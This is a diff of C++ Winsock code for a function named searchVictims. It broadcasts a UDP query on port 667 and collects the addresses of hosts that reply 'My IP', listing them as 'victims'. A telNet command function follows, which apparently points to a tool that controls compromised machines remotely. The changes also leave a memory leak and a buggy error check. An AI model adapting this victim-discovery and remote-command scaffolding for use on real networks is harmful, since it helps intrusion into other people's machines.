@@ -11,55 +11,46 @@
 #include <time.h>
 
 
-void searchVictims(uint32_t* address)
+void searchVictims(SOCKET s, uint32_t* address)
 {
-	SOCKET s = socket(AF_INET, SOCK_DGRAM, 0);
-	if (s == INVALID_SOCKET)
-	{
-		std::cout << "Socket error <" << WSAGetLastError() << ">" << std::endl; return;
-	}
-
 	uint32_t victimsAddr;
-	sockaddr_in addrinfo;
-	sockaddr_in victiminfo;
+	sockaddr_in addrinfo{};
+	sockaddr_in victiminfo{};
 
 	std::string message, response;
 	int error;
 	char* buf = new char[65536];
-	int infoSize = sizeof victiminfo;
+	int infoSize;
 
 	/*these params are the params of the victims*/
-	addrinfo.sin_addr.s_addr = getBroadcastIP();
+	addrinfo.sin_addr.s_addr = inet_addr("10.0.0.8");//broadcastIP();
 	addrinfo.sin_port = htons(667);
 	addrinfo.sin_family = AF_INET;
+
 
 	/*fixed messages for my "protocol"*/
 	message = "What is your IP?";
 	response = "My IP";
 
 	int i = 0;
-	time_t lapTime;
-	time_t currentTime;
+	for (i; address[i] != NULL; i++)
+		continue;
 
-	time(&lapTime);
-	time(&currentTime);
+	infoSize = sizeof addrinfo;
 
-	if (!sendto(s, message.c_str(), message.size(), 0, (sockaddr*)&addrinfo, sizeof addrinfo))
-		std::cout << "Send error <" << WSAGetLastError() << ">" << std::endl;
-
-	for (i; lapTime > currentTime - 1800; i++)//every half an hour i send a new search packet
+	time_t lapTime = time(NULL);
+	if(error = sendto(s, message.c_str(), message.size(), 0, (sockaddr*)&addrinfo, sizeof addrinfo) <= 0)
+		std::cout << WSAGetLastError();
+	for (i; time(NULL) - lapTime < 3; i++) //listening for 3 seconds
 	{
 		do
 		{
 			ZeroMemory(buf, 65536);
-			if (!recvfrom(s, buf, 65536, 0, (sockaddr*)&victiminfo, &infoSize))
+			if (!recvfrom(s, buf, 65536, 0, (sockaddr*)&addrinfo, &infoSize))
 				break;
 		} while (std::string(buf)._Equal(response)); //watiting to recv "My IP"
-		address[i] = victiminfo.sin_addr.s_addr;
-		time(&currentTime);
+		address[i] = addrinfo.sin_addr.s_addr;
 	}
-
-	delete[] buf;
 }
 
 std::string telNet(SOCKET sock, std::string& command)
